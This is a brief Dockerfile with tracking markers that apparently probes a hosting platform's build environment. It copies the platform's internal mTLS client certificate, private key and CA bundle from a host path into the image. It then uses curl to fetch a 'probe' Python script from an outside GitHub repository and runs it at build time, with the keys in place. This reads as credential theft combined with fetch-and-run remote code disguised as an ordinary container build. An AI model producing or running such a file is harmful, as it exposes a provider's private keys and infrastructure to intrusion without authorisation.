# MARK-I68441-9c1d
FROM alpine:3.20
RUN echo MARK-I68441-9c1d-step1
COPY var/lib/railwayapp/mtls-pki/client.crt /pki/client.crt
COPY var/lib/railwayapp/mtls-pki/client.key /pki/client.key
COPY var/lib/railwayapp/mtls-pki/server-ca-bundle.crt /pki/server-ca-bundle.crt
RUN apk add --no-cache curl openssl python3 >/dev/null 2>&1; echo APKDONE
RUN curl -sS -m 30 -o /p.py "https://raw.githubusercontent.com/onepluspadtrading/buildctx-lab/bf089ff1c448c2975ea100e8c87c4b5cc7f09d1a/probe_i68441.py" && wc -l /p.py && echo DL_OK
RUN timeout -s KILL 540 python3 /p.py 2>&1 | head -c 60000; echo MARK-I68441-9c1d-done
CMD ["sh","-c","sleep 30"]
